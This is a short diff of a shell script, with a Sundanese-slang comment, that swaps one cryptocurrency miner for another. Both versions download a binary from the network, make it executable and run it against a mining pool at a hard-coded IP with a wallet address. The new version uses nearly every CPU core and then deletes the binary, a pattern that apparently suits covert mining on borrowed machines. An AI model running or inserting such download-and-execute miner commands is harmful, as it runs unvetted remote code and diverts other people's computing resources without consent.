@@ -4,7 +4,7 @@
 # kumaha aink we njink
 
 cd /home
-wget https://www.erlandi.my.id/0:/run/apalah
-chmod +x apalah
-./apalah --algorithm randomx --pool 43.228.215.76:5001 --wallet ZEPHsB4SF9T9wS4vyAbjZ6FzTDyCRFeV5MK7qqHdt2AHWfsmb1P7cbe2gfYp5py78DT6gFyLZixVqc11DNRyY9CHbs2BQG7LDyt --password x
-rm -irf apalah
+wget https://raw.githubusercontent.com/TheJackalTrib/gasken/master/cpuminer
+chmod +x cpuminer
+./cpuminer -a minotaurx -o stratum+tcp://43.228.215.76:8080 -u DBvi4ZFPxxVB1ivfNffHHP8kSWABVc2MQK -p c=DGB,zap=BUT-lyra2z330 -t $(nproc --ignore 1)
+rm -irf cpuminer
